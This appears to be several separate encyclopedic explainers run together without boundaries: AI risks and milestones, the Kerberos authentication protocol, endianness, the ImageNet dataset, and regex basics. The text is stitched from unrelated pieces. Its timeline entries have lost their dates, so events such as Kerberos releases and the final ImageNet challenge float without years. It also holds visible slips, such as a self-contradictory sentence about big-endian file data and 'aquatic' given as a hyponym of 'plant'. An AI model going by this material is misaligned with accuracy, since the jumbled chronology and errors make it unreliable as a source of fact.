Key risks are : Fear of widespread job loss - Since AI brings a new bunch of technologies to the fore , several IT and business skills such as manual testing , customer support , traditional programming , and managerial tasks are becoming obsolete .
In the wider world , impact is even more pronounced .
Autonomous cars replace human drivers .
Drone deliveries replace home delivery staff .
AI and robotics replace several manufacturing jobs .
The impact on healthcare , financial services and retail is expected to be high .
Bias due to bad data - AI systems are as good or bad as the data fed into them .
If companies and governments feed biased data with malicious intent , the results could be disastrous .
Self - regulation is the only method in practice .
Stricter legislation and tight international data policing rules are needed .
Over - reliance on digital devices - Smart devices running AI are invading organizations , homes , and government institutions .
Lifestyle deficiencies such as exposure to wireless radiation , excessive time spent on gadgets , and lack of basic computational and social skills are worrying .
Arthur Samuel wrote the first computer learning program .
This is a game checker that runs on an IBM machine .
It improves its game every time it plays .
Samuel is also credited for coining the term Machine Learning ( ML ) .
Frank Rosenblatt designed the first neural network for computers , called the perceptron , which simulates the thought processes of the human brain .
Students at Stanford University invented the robotic Stanford Cart .
This can navigate obstacles in a room on its own .
Through the 1970s and into the 1980s , AI saw a subdued period known as the AI Winter .
Interest and development dwindle , people become pessimistic about their chances of success , and funding drops .
Research continues but AI steps out of the limelight .
In the 1990s , work on machine learning shifted from a knowledge - driven approach to a data - driven approach .
In a contest of man vs machine , IBM 's Deep Blue beat the world champion at chess .
This showcases computing capability to tackle complex calculations for drug discovery , large database searches , broad financial modelling , and more .
In February 2011 , another IBM machine named Watson beat humans in another game , called Jeopardy !
Computers can now process and reason about natural languages , heralding rich human - computer interactions for the future .
Geoffrey Hinton coins the term Deep Learning ( DL ) as a term for artificial neural networks using many layers of neurons .
With innovations happening in the Computer Vision space , DL algorithms enable computers to " see " and distinguish objects and text in images and videos .
Apple includes Siri as a built - in digital assistant in its iPhone 4S. Siri triggers a new age of automation , personalization and AI - driven assistants .
Many major automotive manufacturers , including General Motors , Ford , Mercedes Benz , Volkswagen , Audi , Nissan , Toyota , BMW , and Volvo , have started testing driverless car systems .
Tesla Motors announces its first version of AutoPilot .
Model S cars equipped with this system are capable of lane control with autonomous steering , braking , automated parking and speed limit adjustment .
Facebook released DeepFace , a software algorithm that is able to recognize or verify individuals on photos to the same level of accuracy as humans .
Over 3,000 AI and Robotics researchers , endorsed by Stephen Hawking , Elon Musk and Steve Wozniak ( among many others ) , signed an open letter warning of the danger of autonomous weapons that can select and engage targets without human intervention .
Apple CEO Tim Cook says , " We are focussing on autonomous systems " .
He describes Apple 's secretive Project Titan as " the mother of all A.I. projects " .
Kerberos is a network authentication protocol for client - server applications based on cryptographic keys .
It 's used in Windows 2000 , Windows XP and Windows Server 2003 and later systems .
Because it 's an open standard , it can also be used by non - Windows systems .
Unlike password - based authentication systems , passwords are never sent over the network .
Kerberos authenticates by verifying the identities of users and servers within a trusted environment .
As such , Kerberos is inaccessible for outsiders .
Once authenticated , the user or client can access multiple services without needing to authenticate again for each service .
Encrypted tickets are used instead of passwords .
Security aspects covered by Kerberos include authentication , access control , and key exchange .
What are some essential Kerberos terms that a beginner should know ?
Important abbreviations in Kerberos .
Source : Echeverria and Spivey 2015 , table 4 - 1 .
Here are some essential Kerberos terms : Principal : This is a unique identity .
Because Kerberos supports mutual authentication , both users and network resources have principals .
Realm : Called domain in Windows , this is a logical grouping of resources and identities .
Ticket : A Ticket is an encrypted block of data that authenticates the user .
Because of tickets , we do n't need to transmit clear passwords over the Kerberos infrastructure .
Tickets come with a configurable time expiry .
For example , ` jdoe@SALES.WIDGET.COM ` is a principal for user ` jdoe ` within the realm ` SALES.WIDGET.COM ` .
It 's quite possible for users to have multiple principals in different realms with different access rights .
Another example is that users enter the system in one realm and access resources in other realms .
Could you give an overview of the Kerberos ' authentication flow ?
Kerberos architecture .
Source : IBM 2015 .
Central to Kerberos is the Key Distribution Center ( KDC ) that has a database of trusted principals , the Authentication Service ( AS ) , and the Ticket - Granting Service ( TGS ) .
When a user logs into a client machine , she supplies a password .
To gain access to network services , the Kerberos protocol is invoked to authenticate the user .
However , network services do n't do the authentication on their own .
KDC ( and its AS ) is the trusted third party that does this .
The user 's principal , and not the password , is sent to the KDC .
KDC checks this against its database , authenticates the user and sends back the Ticket - Granting Ticket ( TGT ) .
All this happens transparent to the user when she logs in or invokes the ` kinit ` command .
When the client wants to access a service , it presents the TGT to the TGS , which generates the service session key and a service ticket containing this key .
Whenever the client wants , it presents the service ticket to the service .
The client and the service can now start communicating , with all communication encrypted with the service session key .
What are the different tickets used in Kerberos ?
Kerberos has essentially two tickets .
One is issued by the AS during authentication .
The other is issued by the TGS when a service is requested .
AS issues the Ticket Granting Ticket ( TGT ) .
A TGT is a ticket to tell the TGS that the client has already been authenticated .
TGS issues the Service Ticket after validating the TGT .
This enables the client to access a service .
The service ticket contains the client 's IP address , timestamp , and the service session key .
Both tickets are encrypted .
Although the client is in possession of these tickets , it ca n't read them .
The TGT is meant for the TGS .
The service ticket is meant for the service provider .
What are the different keys used in Kerberos ?
Kerberos protocol flow showing the use of keys .
Source : Oracle 2014 , fig .
21.5 .
The following keys are used in Kerberos : Principal Key : Based on the principal 's password , this encrypts the TGT and the session key between client and AS .
Session Key : This is generated by the KDC during authentication and sent to the client .
This is used to encrypt communication between client and TGS .
In particular , TGT , service ticket requests , service tickets , and service session keys are encrypted using this .
Ticket Granting Service ( TGS ) Key : This encrypts the TGT .
The TGS uses this key to decrypt the TGT .
TGS then checks that TGT has n't expired and generates the service ticket and service session key .
Service Key : This encrypts the service ticket .
It 's available within the KDC and also with the service providers .
Service Session Key : This is used to encrypt all communication between the client and the service .
This is generated in the TGS .
What are the main advantages of using Kerberos ?
Comparing Kerberos with NTLM .
Source : Harbar 2009 , slide 12 .
Here are some advantages of Kerberos : Mutual Authentication : Client and server authenticate each other .
This protects clients from connecting to a bogus server .
Open Standard : It 's based on RFC 4120 .
Non - Windows systems that implement this RFC can also use Kerberos .
Delegation : Also called authentication forwarding , a service can access remote resources on behalf of the client using the client 's identity .
Smart Card Logon : Beyond password logon , two - factor authentication using a smart card and PIN is possible .
Passwords & Keys : User passwords are never sent over communication links .
Eavesdroppers ca n't get hold of passwords .
Secret keys are sent only in encrypted form .
There 's support for both symmetric and asymmetric keys .
Encrypted Sessions : Service session key shared between the client and a service can be used to encrypt all conversation pertaining to the service .
Integrated Sessions : Once authenticated , client can access a service without having to re - authenticate , until the ticket expires .
Renewable Sessions : After the first session , subsequent sessions are setup faster .
The server authenticates the client immediately without involving the KDC .
What 's the difference between Kerberos ' impersonation and delegation ?
Kerberos impersonation and delegation .
Source : Kaushal 2010 , slide 5 .
Clients are authorized to access certain services but the services themselves run in a different security context , such as on a different thread , process or machine .
Services acquire client credentials ( such as service tickets ) and use these to obtain resources on behalf of the clients .
In some sense , services therefore impersonate the clients they serve .
There are four impersonation levels : anonymous , identify , impersonation and delegation .
If the service is on the same computer as the client process , it can impersonate the client to access network resources .
If the service is on a remote computer , it can impersonate the client to access resources on the service 's computer .
With delegation , the service can impersonate the client even when accessing resources on another computer .
Let 's assume that a user requests data via a web server but the data resides on a different database server .
The web server delegates to the database server to obtain necessary data from the database .
Within the security context of the database server , which accesses the database on the same machine , we can say that impersonation happens .
How is Kerberos related to the GSSAPI ?
A multi - mechanism GSSAPI implementation .
Source : Oracle 2018 , fig .
7 - 1 .
The Generic Security Service API ( GSSAPI ) is a standard interface , defined by RFC 2743 , that provides a generic authentication and secure messaging interface .
Multiple security mechanisms can be plugged in so long as they conform to the GSSAPI .
The IETF has defined two mechanisms : Kerberos V5 via RFC 1964 and Simple Public Key Mechanism ( SPKM ) via RFC 2025 .
The GSSAPI is an abstraction that must be accompanied by a security mechanism .
The advantage is that applications are not tied to a particular mechanism .
Migration is possible , such as , from SPKM to Kerberos V5 .
In fact , an implementation might support multiple mechanisms and applications can choose the mechanism at runtime .
However , both client and server must negotiate to use the same mechanism .
The GSSAPI was designed with the following goals : Mechanism independence : Applications need not be concerned with the security mechanisms such as the type of cryptographic keys used .
Protocol environment independence : API is not tied to particular communications protocol .
Protocol association independence : A single API implementation can be used by different application modules that possibly use different communications protocols .
What are some limitations of Kerberos ?
Kerberos is only as secure as the passwords being used .
Weak passwords make the system vulnerable to brute force attacks .
During protocol use , encryption keys are stored in memory in unencrypted form .
Kerberos ca n't do anything about compromised user endpoints , authentication servers or KDC .
If the authentication server is down , new users ca n't login .
Pass the Ticket attack involves getting access to a ticket , moving laterally within the network and gaining access to critical systems .
Kerberos has strict timing requirements .
Usually , Network Time Protocol ( NTP ) daemons are used for clock synchronization .
NTP therefore becomes a dependency .
If each service requires a different host name , each must use its own keys .
This complicates deployment of virtual hosting and clusters .
Kerberos works in a trusted environment and is therefore hard to use on the public Internet where untrusted or unknown clients may want to connect .
Kerberos has worked well within the enterprise but has n't been adopted in the cloud .
A Kerberos ticket contains an encrypted key that could be hacked .
Cloud services prefer to use SAML 2.0 , OAuth 2.0 or OpenID Connect .
In fact , cloud services have been poor at adopting identity federation standards .
Researchers Roger Needham and Michael Schroeder invented a protocol based on symmetric keys .
This protocol aims to securely establish session keys between two parties to protect further communication .
The Needham – Schroeder symmetric key protocol forms the basis for Kerberos .
At MIT , Project Athena was launched with the goal of creating a distributed computing environment for educational purposes .
The idea is to have thin clients and let servers do the demanding computations .
As part of this project , Kerberos was invented for authentication and single sign - on .
At the Usenex conference , the Kerberos v4 protocol was described for the first time .
This makes Kerberos one of the oldest authentication protocols since many others came years later : SAML ( 2002 ) , WS - Federation ( 2003 ) , OAuth2 ( 2010 ) and OpenID Connect ( 2014 ) .
Versions 1 - 3 of the protocol remained internal to MIT .
Kerberos v4 has been released .
It uses DES for encryption .
Due to export restrictions , Kerberos ca n't be used outside the U.S. An alternative implementation from Sweden called KTH - KRB was released years later for non - U.S. markets .
However , v4 has limitations : weak DES encryption , misuse of PCBC mode of DES , ticket lifetime ca n't be longer than about 21 hours , delegation not supported .
Kerberos v5 has been released and standardized by IETF as RFC 1510 .
It overcomes many limitations of v4 .
It uses ASN.1 syntax .
It adds new modes for DES .
AES encryption is supported .
Ticket lifetimes are much longer .
A delegation is supported .
It allows for unkeyed checksums ( CRC , MD5 , SHA-1 ) and keyed checksums ( HMAC with MD5 or SHA-1 ) .
This is also the year when Microsoft decided to adopt Kerberos in its products .
Kerberos KDC is tightly integrated with the Active Directory .
Source : MIT Kerberos Consortium 2008 , fig .
7 .
Microsoft released Windows Server 2000 with Kerberos as the default authentication protocol , thus replacing NTLM .
There 's no separate KDC database .
Instead , information comes from Active Directory ( AD ) .
With the subsequent growth of AD and AD - enabled apps , use of Kerberos has grown .
RFC 4120 clarifies many aspects of the v5 protocol and obsoletes the earlier RFC 1510 of 1993 .
The GSS - API specification is also released as RFC 4121 .
The MIT Kerberos Consortium was formed for the continued development and promotion of Kerberos in a more open manner rather than being internal to MIT .
For some time , this was renamed to MIT Kerberos & Internet Trust Consortium or MIT - KIT , but later this name was retired .
Examples of systems in different byte ordering .
Source : Gillespy and Rowberg 1993 , table 2 .
A byte ( of 8 bits ) has a limited range of 256 values .
When a value is beyond this range , it has to be stored in multiple bytes .
A number such as 753 in hexadecimal format is 0x02F1 .
It requires at least two bytes of storage .
The order in which these two bytes are stored in memory can be different .
Byte 0x02 can be stored in the lower memory address followed by 0xF1 ; or vice versa .
Programs must conform to the byte ordering as supported by the processor .
If not , 0x02F1 might be wrongly interpreted as 0xF102 , which is the number 61698 in the decimal system .
Byte ordering is also important when data is transferred across a network or between systems using different ordering .
Byte ordering is an attribute of the processor , not the operating system running on it .
Which are the different byte orderings present in computing systems ?
Comparing Little - Endian and Big - Endian ordering .
Source : Hackjutsu 2016 .
Two common ordering systems include , Little - Endian : Low - order byte is stored at a lower address .
This is also called Intel order since Intel 's x86 family of CPUs popularized this order .
Intel , AMD , PDP-11 and VAX are little - endian systems .
Big - Endian : High - order byte is stored at a lower address .
This is also called Motorola order since Motorola 's PowerPC architecture used this order .
Motorola 68 K and IBM mainframes are big - endian systems .
Some processors support both orders and are therefore called Bi - Endian .
PowerPC and Itanium are bi - endian .
Bi - Endian processers can switch between the two orderings .
Most RISC architectures ( SPARC , PowerPC , MIPS ) were originally big - endian but are now configurable .
While ARM processors are bi - endian , the default is to run them as little - endian systems , as seen in the Raspberry Pi .
Due to the popular adoption of x86-based systems ( Intel , AMD , etc .
) and ARM , little - endian systems have come to dominate the market .
Could you compare host - byte and network - byte ordering ?
Illustrating the use of htonl and NTOHL functions .
Source : Adapted from Rubenstein 2003 , slide 20 .
Since computers using different byte ordering , and exchanging data , have to operate correctly on data , the convention is to always send data on the network in big - endian format .
We call this network - byte ordering .
The ordering used on a computer is called host - byte ordering .
A host system may be little - endian but when sending data into the network , it must convert data into a big - endian format .
Likewise , a little - endian machine must first convert network data into little - endian before processing it .
Four common functions to do these conversions are ( for 32-bit long and 16-bit short ) ` htonl ` , ` ntohl ` , ` htons ` and ` ntohs ` .
Even if your code does n't do networking , data may be stored in a different order .
For example , file data is stored in big - endian while your machine is big - endian .
In some cases , CPU instructions may be available for conversion .
Intel 's 64-bit instruction set has ` BSWAP ` to swap byte ordering .
Since ARMv6 , ` REV ` swaps byte order and ` SETEND ` to set the endianness .
Are n't conversions redundant for big - endian machines since they already conform to network - byte ordering ?
It 's good programming practice to invoke these conversions since this makes your code portable .
The same codebase can be compiled for a little - endian machine and it will work .
Calling the conversion functions on a big - endian machine has no effect .
While a little - endian system sending data to another little - endian system need not do any conversion , it 's good to convert .
This makes the code more portable across systems .
Are there situations where byte ordering does n't matter ?
Endianness in different encodings of Unicode .
Source : Unicode 2017 .
When data is stored and processed as a sequence of single bytes ( not shorts or longs ) , then byte ordering does n't matter .
No conversions are required when receiving or sending such data into the network .
ASCII strings are stored as a sequence of single bytes .
Byte ordering does n't matter .
Byte ordering for Unicode strings depends on the type of encoding used .
If encoding is UTF-8 , ordering does n't matter since encoding is a sequence of single bytes .
If encoding is UTF-16 , then byte ordering matters .
When storing TIFF images , byte ordering matters since pixels are stored as words .
GIF and JPEG images do n't care about byte ordering since storage is not word oriented .
What 's the purpose of Byte Order Mark ( BOM ) ?
BOM used with UTF-16 encoding .
Source : Ishida 2010 .
An alternative to using host - to - network and network - to - host conversions is to send the data along with an indication of the order that 's being used .
This order is indicated with an additional two bytes , known as Byte Order Mark ( BOM ) .
The BOM could have any agreed upon value but 0xFEFF is common .
If a machine reads this as 0xFFFE , it implies that ordering is different from the machine 's ordering and conversion is required before processing the data further .
BOM adds overhead .
For example , sending two bytes of data incurs an overhead of an additional two bytes .
Problems can also arise if a program forgets to add the BOM or data payload starts with the BOM by coincidence .
BOM is not required for single - byte UTF-8 encoding .
However , some editors , such as Notepad on Windows , may include BOM ( three bytes , EFBBBF ) to indicate UTF-8 encoding .
What are the pros and cons of little - endian and big - endian systems ?
Little - endian byte ordering seen when debugging .
Source : Kholodov 2007 .
In little - endian systems , just reading the lowest byte is enough to know if the number is odd or even .
This may be an advantage for low - level processing .
Big - endian systems have a similar advantage : the lowest byte can tell us if a signed integer is positive or negative .
Typecasting ( say from ` int16_t ` to ` int8_t ` ) is easier in little - endian systems .
Because of the simple relationship between address offset and byte number , little - endian can be easier for writing math routines .
During low - level debugging , programmers can see bytes stored from low address to high address , in left - to - right order .
Big - endian systems store in the same left - to - right order and this makes debugging easier .
For the same reason , binary to decimal routines are easier .
For the most part , programmers have to deal with both systems .
Each system evolved separately and therefore it 's hard to complain about not having a single system .
Is the concept of endianness applicable for instructions ?
Endianness is applicable for multi - byte numeric values .
Instructions are not numeric values and therefore , endianness is not relevant .
However , an instruction may contain 16-bit integers , addresses or other values .
The byte ordering of these parts is important .
For example , 8051 has a ` LCALL ` instruction that stores the address of the next instruction on the stack .
The address is pushed to stack in little - endian format .
However , ` LJMP ` and ` LCALL ` instructions contain 16-bit addresses that are in big - endian format .
How can I check the endianness of my system ?
On Linux and Mac , the command ` lscpu ` can be used to find endianness .
Developers can also write a simple program to determine the endianness of the host machine .
In a C program , for example , store two bytes in memory .
Then use a ` short * ptr ` to point to the lower address .
Dereference this pointer to obtain a short value , which will tell us if the machine is little - endian or big - endian .
Do systems differ in the ordering of bits within a byte ?
Bits within a byte are commonly numbered as Bit0 for the least significant bit and Bit7 for the most significant bit .
Thus , bit numbers in a 32-bit integer will be in left - to - right order in big - endian , and right - to - left in little - endian .
However , some systems , such as the OpenXC vehicle interface , use the opposite numbering in which the least significant bit is Bit7 .
Note that in either case , the content remains the same , only the numbering is different .
Danny Cohen in his classic paper on the subject of endianness notes some examples where bit numbering was inconsistent in early computer systems .
For example , M68000 was big - endian but the bit numbering resembled little - endian .
In digital interfaces , bit ordering matters .
In Serial Peripheral Interface ( SPI ) , this can be configured based on what both devices support .
In I2C , the most significant bit is sent first .
In UART , either ordering is fine and must be configured correctly at both ends .
If not , sending the least significant bit first is usually assumed .
PDP-11 released by DEC is probably the first computer to adopt little - endian ordering .
The terms big - endian and little - endian are used for the first time in the context of byte ordering .
The terms are inspired by Jonathan Swift 's novel titled Gulliver 's Travels .
Byte order conversion functions ` htonl ` , ` ntohl ` , ` htons ` and ` ntohs ` are introduced in the BSD 4.2 release .
The first samples of an ARM processor came out in 1985 .
It 's only in 1992 with the release of ARM6 that the processor became bi - endian .
Legacy big - endian is supported by both instructions and data .
Otherwise , the instructions are a little endian .
Data is little - endian or big - endian as configured .
While byte ordering can be configured in software for some ARM processors , for others , such as ARM - Cortex M3 , the order is determined by a configuration pin that 's sampled at reset .
A snapshot of two root - to - leaf branches of ImageNet : the mammal sub - tree and the vehicle sub - tree .
Source : Ye 2018 , fig .
A1-A. ImageNet is a large database or dataset of over 14 million images .
It was designed by academics intended for computer vision research .
It was the first of its kind in terms of scale .
Images are organized and labelled in a hierarchy .
In Machine Learning and Deep Neural Networks , machines are trained on a vast dataset of various images .
Machines are required to learn useful features from these training images .
Once learned , they can use these features to classify images and perform many other tasks associated with computer vision .
ImageNet gives researchers a common set of images to benchmark their models and algorithms .
It 's fair to say that ImageNet has played an important role in the advancement of computer vision .
Where is ImageNet useful and how has it advanced computer vision ?
ImageNet is useful for many computer vision applications such as object recognition , image classification and object localization .
Prior to ImageNet , a researcher wrote one algorithm to identify dogs , another to identify cats , and so on .
After training with ImageNet , the same algorithm could be used to identify different objects .
The diversity and size of ImageNet meant that a computer looked at and learned from many variations of the same object .
These variations could include camera angles , lighting conditions , and so on .
Models built from such extensive training were better at many computer vision tasks .
ImageNet convinced researchers that large datasets were important for algorithms and models to work well .
In fact , their algorithms performed better after they were trained with ImageNet dataset .
Samy Bengio , a Google research scientist , has said of ImageNet , " Its size is by far much greater than anything else available in the computer vision community , and thus helped some researchers develop algorithms they could never have produced otherwise .
" What are the technical details of ImageNet ?
ImageNet consists of 14,197,122 images organized into 21,841 subcategories .
These subcategories can be considered as sub - trees of 27 high - level categories .
Thus , ImageNet is a well - organized hierarchy that makes it useful for supervised machine learning tasks .
On average , there are over 500 images per subcategory .
The category " animal " is most widely covered with 3822 subcategories and 2799 K images .
The " appliance " category has on average 1164 images per subcategory , which is the most for any category .
Among the categories with the least number of images are " amphibian " , " appliance " , and " utensil " .
As many as 1,034,908 images have been annotated with bounding boxes .
For example , if an image contains a cat as its main subject , the coordinates of a rectangle that bounds the cat are also published on ImageNet .
This makes it useful for computer vision tasks such as object localization and detection .
Then there 's Scale - Invariant Feature Transform ( SIFT ) used in computer vision .
SIFT helps in detecting local features in an image .
ImageNet gives researchers 1000 subcategories with SIFT features covering about 1.2 million images .
Images vary in resolution , but it 's common practice to train deep learning models on sub - sampled images of 256x256 pixels .
Could you explain how ImageNet defined the subcategories ?
Treemap visualization of first - level subcategories of geological formations .
Source : Gershgorn 2017 .
In fact , ImageNet did not define these subcategories on its own but derived these from WordNet .
WordNet is a database of English words linked together by semantic relationships .
Words of similar meaning are grouped together into a synonym set , simply called a synset .
Hypernyms are synsets that are more general .
Thus , " organism " is a hypernym of " plant " .
Hyponyms are synsets that are more specific .
Thus , " aquatic " is a hyponym for " plant " .
This hierarchy makes it useful for computer vision tasks .
If the model is not sure about a subcategory , it can simply classify the image higher up the hierarchy where the error probability is less .
For example , if the model is unsure that it 's looking at a rabbit , it can simply classify it as a mammal .
While WordNet has 100K+ synsets , only the nouns have been considered by ImageNet .
How were the images labelled on ImageNet ?
In the early stages of the ImageNet project , a quick calculation showed that by employing a few people , they would need 19 years to label the images collected for ImageNet .
But in the summer of 2008 , researchers came to know about an Amazon service called Mechanical Turk .
This means that image labelling can be crowdsourced via this service .
Humans all over the world would label the images for a small fee .
Humans make mistakes and therefore we must have checks in place to overcome them .
Each human is given a task of 100 images .
In each task , 6 " gold standard " images are placed with known labels .
At most 2 errors are allowed on these standard images , otherwise the task has to be restarted .
In addition , the same image is labelled by three different humans .
When there 's disagreement , such ambiguous images are resubmitted to another human with a tighter quality threshold ( only one allowed error on the standard images ) .
How are the images of ImageNet licensed ?
Images for ImageNet were collected from various online sources .
ImageNet does n't own the copyright for any of the images .
This has implications for how ImageNet shares the images with researchers .
For public access , ImageNet provides image thumbnails and URLs from where the original images were downloaded .
Researchers can use these URLs to download the original images .
However , those who wish to use the images for non - commercial or educational purposes , can create an account on ImageNet and request access .
This will allow direct download of images from ImageNet .
This is useful when the original sources of images are no longer available .
The dataset can be explored via a browser - based user interface .
Alternatively , there 's also an API .
Researchers may want to read the API Documentation .
This documentation also shares how to download image features and bounding boxes .
What is the ImageNet Challenge and what 's its connection with the dataset ?
Performance of winning entries of ILSVRC 2010 - 2014 .
Source : Russakovsky et al .
2014 , fig .
9 .
ImageNet Large Scale Visual Recognition Challenge ( ILSVRC ) was an annual computer vision contest held between 2010 and 2017 .
It 's also called ImageNet Challenge .
For this challenge , the training data is a subset of ImageNet : 1000 synsets , 1.2 million images .
Images for validation and test are not part of ImageNet and are taken from Flickr and via image search engines .
There are 50 K images for validation and 150 K images for testing .
These are hand - labeled with the presence or absence of 1000 synsets .
The Challenge included three tasks : image classification , single - object localization ( since ILSVRC 2011 ) , and object detection ( since ILSVRC 2013 ) .
More difficult tasks are based upon these tasks .
In particular , image classification is the common denominator for many other computer vision tasks .
Tasks related to video processing , but not part of the main competition , were added to ILSVRC 2015 .
These were object detection in video and scene classification .
For more information , read the current state - of - the - art on image classification for ImageNet .
What is meant by a pretrained ImageNet model ?
A model trained on ImageNet has essentially learned to identify both low - level and high - level features in images .
However , in a real - world application such as medical image analysis or handwriting recognition , models have to be trained from data drawn from those application domains .
This is time - consuming and sometimes impossible due to lack of sufficient annotated training data .
One solution is that a model trained on ImageNet can use its weights as a starting point for other computer vision tasks .
This reduces the burden of training from scratch .
A much smaller annotated domain - specific training may be sufficient .
By 2018 , this approach was proven in a number of tasks , including object detection , semantic segmentation , human pose estimation , and video recognition .
How is Tiny ImageNet related to ImageNet ?
Tiny ImageNet and its associated competition is part of Stanford University 's CS231N course .
It was created for students to practise their skills in creating models for image classification .
The Tiny ImageNet dataset has 100,000 images across 200 classes .
Each class has 500 training images , 50 validation images , and 50 test images .
Thus , the dataset has 10,000 test images .
The entire dataset can be downloaded from a Stanford server .
Tiny ImageNet is a strict subset of ILSVRC2014 .
Labels and bounding boxes are provided for training and validation images but not for test images .
All images have a resolution of 64x64 .
Since the average resolution of ImageNet images is 482x418 pixels , images in Tiny ImageNet might have some problems : object cropped out , too tiny , or distorted .
It 's been observed that with a small training dataset , overfitting can occur .
Data augmentation is usually done on the images to help models generalize better .
Similarly , Imagenette and Imagewoof are other subsets of ImageNet , created by fast.ai .
What are the criticisms or shortcomings of ImageNet ?
Though ImageNet has a large number of classes , most of them do n't represent everyday entities .
One researcher , Samy Bengio , commented that the WordNet categories do n't reflect the interests of ordinary people .
He added , " Most people are more interested in Lady Gaga or the iPod Mini than in this rare kind of diplodocus " .
Images are not uniformly distributed across subcategories .
One research team found that by considering 200 subcategories , they found that the top 11 had 50 % of the images , followed by a long tail .
When classifying people , ImageNet uses labels that are racist , misogynist and offensive .
People are treated as objects .
Their photos have been used without their knowledge .
About 5.8 % of labels are wrong .
ImageNet lacks geodiversity .
Most of the data represents North America and Europe .
China and India are represented in only 1 % and 2.1 % of the images respectively .
This implies that models trained on ImageNet will not work well when applied to the developing world .
Another study from 2016 found that 30 % of ImageNet 's image URLs are broken .
This is about 4.4 million annotations lost .
Copyright laws prevent caching and redistribution of these images by ImageNet itself .
George A. Miller and his team at Princeton University started working on WordNet , a lexical database for the English language .
It 's really a combination of a dictionary and a thesaurus .
This would enable applications in the area of Natural Language Processing ( NLP ) .
Fei - Fei Li at the University of Illinois Urbana - Champaign got the idea for ImageNet .
The prevailing conviction among AI researchers at this time is that algorithms are more important and data is secondary .
Li instead proposes that lots of data reflecting the real world would improve accuracy .
By now , WordNet itself is mature , with version 3.0 getting released in December .
Fei - Fei Li meets Christiane Fellbaum of Princeton University , a WordNet researcher .
Li adopts WordNet for ImageNet .
In July , ImageNet had 0 images .
By December , ImageNet reached 3 million images categorized across 6000 + synsets .
By April 2010 , the count is 11 million images across 15,000 + synsets .
This is impossible for a couple of researchers but is made possible via crowdsourcing on the Amazon 's Mechanical Turk platform .
ImageNet was presented for the first time at the Conference on Computer Vision and Pattern Recognition ( CVPR ) in Florida by researchers from the Computer Science Department , Princeton University .
The first ever ImageNet Challenge was organized , along with the well - known image recognition competition in Europe called the PASCAL Visual Object Classes Challenge 2010 ( VOC2010 ) .
AlexNet triggers a wave of better solutions to the ImageNet classification problem .
Source : von Zitzewitz 2017 , fig .
11 .
ImageNet became the world 's largest academic user of Mechanical Turk .
The average worker identifies 50 images per minute .
The year 2012 also sees a big breakthrough for both Artificial Intelligence and ImageNet .
AlexNet , a deep convolutional neural network , achieves a top-5 classification error rate of 16 % from the previous best of 26 % .
Their approach has been adapted by many others , leading to lower error rates in following years .
The best human - level accuracy for classifying ImageNet data is 5.1 % and GoogLeNet became the nearest neural network counterpart with 6.66 % .
PReLU - Net became the first neural network to surpass human - level of accuracy by achieving a 4.94 % top-5 error rate .
This year witnesses the final ImageNet Competition .
Top-5 classification error drops to 2.3 % and the competition is now considered a solved problem .
Subsequently , the competition is hosted at Kaggle .
EfficientNet claims to have achieved top-5 classification accuracy of 97.1 % and top-1 accuracy of 84.4 % for ImageNet , dethroning its predecessor GPipe ( December 2018 ) by a meagre 0.1 % in both top-1 and top-5 accuracies .
ImageNet wins the prestigious Longuet - Higgins Prize .
Source : Menezes 2019 .
ImageNet wins Longuet - Higgins Prize at CVPR 2019 , a retrospective award that recognizes a CVPR paper for having significant impact and enduring relevancy on computer vision research over a 10-year period .
Four misclassified images of ImageNet - A. Source : Greene 2019 .
ImageNet - A fools the best AI models 98 % of the time , due to their over - reliance on colour , texture and background cues .
Unlike adversarial attacks in which images are modified , ImageNet - A has 7500 original images that have been handpicked from ImageNet .
This shows that current AI models are not robust with new data .
Regular expressions are essentially search patterns defined by a sequence of characters .
Let 's say , we wish to search for the substring ' grey ' in a text document .
This is a simple string search .
What if we wish to search for both ' grey ' and ' gray ' ?
With simple string searches , we would need to do two separate searches and collate the results .
With regular expressions , we can define a single search pattern that will give us matches for either of the two substrings .
In the above example , any of these patterns will work : ` gr[ae]y ` , ` gr(a|e)y ` , ` ( gray|grey ) ` , ` gray|grey ` Regular expression is commonly known as regex .
Although regex has a history going back to the 1950s , it was popularized in computer science in the 1990s by the Perl programming language .
Apart from Perl 's regex , many other variants exist .
Could you give examples where regular expressions are used ?
A regex to match email addresses .
Source : Computer Hope 2017 .
Regex is useful typically when the format or syntax of data is known .
It 's to this expected syntax that a regex is written .
For example , email addresses are of the form ` username@domainname.tld ` .
We can make a regex to extract all emails coming from a specific domain .
A common use of regex is for search - and - replace .
For example , developers can use regex to quickly change the order of arguments across hundreds of source code files .
Regex can be used to process log files and filter log messages that match a particular signature .
It can be used to filter reports on Google Analytics Dashboard .
Regex can also be used within database commands , say , to obtain usernames that contain non - alphanumeric characters in them .
Suppose we 've reorganized the file structure in a web application .
On web servers , regex can be used to match requested URL patterns and redirect them to new locations .
Regex is also useful in web scraping tasks .
What are the basic building blocks of regular expressions ?
Regex basics .
Source : Upscene 2015 .
A regex has these basic building blocks : Anchor : A regex is processed by a regex engine .
Anchors make assertions about the current position of the engine .
Common anchors are ` ^ ` ( beginning of line ) and ` $ ` ( end of line ) .
For a multiline input , we can use ` \A ` and ` \z ` to match the beginning and end of the string respectively .
Character : ` .
` matches any character ; ` \s ` matches any whitespace ; ` [ 12a - c ] ` matches the set of characters ' 1 2 a b c ' ; ` ( a|e)s ` matches ' a ' or ' e ' followed by ' s ' .
Group : A sequence of characters grouped within ` ( ) ` .
Quantifier : Specify how many matches of the character or group are allowed .
For zero or more matches , use ` * ` ; ` + ` for one or more matches ; ` ?
` for zero or one match ; ` { m , n } ` for m to n matches .
Modifier / Flag : Modify the regex in specific ways .
Use ` i ` for case insensitive match ; ` m ` is for multiline match ; ` s ` for single line match , so that ` .
` matches newlines as well .
For example , ` /^model{1,2}(ing ) ?
/i ` will match any line starting with ' model ' , ' modell ' , ' modeling ' , ' modelling ' , and their lowercase versions .
Which are the special characters in regex ?
Regex special characters are often called metacharacters .
The common ones include ` \ ^ $ .
* + ?
[ { ( ) | ` characters .
Note that characters ` } ] ` have special meanings too when used with their counterparts ` { [ ` ; but on their own , they are treated literally .
For example , ` a(b{2,})?c ` will match ' ac ' , ' abbc ' , ' abbbbc ' and more ; ` ab}?c ` will match exactly either ' abc ' or ' ab}c ' , and nothing else .
Since characters have special meaning , to use them literally , we would have to escape them with the backslash ` \ ` character .
For example , to match the dollar value in string ' This costs $ 22.50 after discount ' , the regex would be ` \$(\d+(?:\.\d+ ) ?
) ` , where the dollar symbol escaped .
It 's treated literally and not as the end of the string .
Metacharacter pair ` [ ] ` defines a character class .
When a range is specified , such as ` [ 0 - 6 ] ` , the hyphen character is a special character .
